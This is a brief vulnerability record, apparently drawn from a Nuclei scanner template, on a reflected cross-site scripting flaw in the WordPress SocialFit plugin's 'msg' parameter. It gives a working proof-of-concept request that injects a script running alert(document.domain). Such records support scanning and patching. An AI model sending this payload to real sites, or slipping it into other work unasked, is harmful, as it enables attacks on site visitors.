# Vulnerability: WordPress SocialFit - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-socialfit-xss.yaml`)

## Description
WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

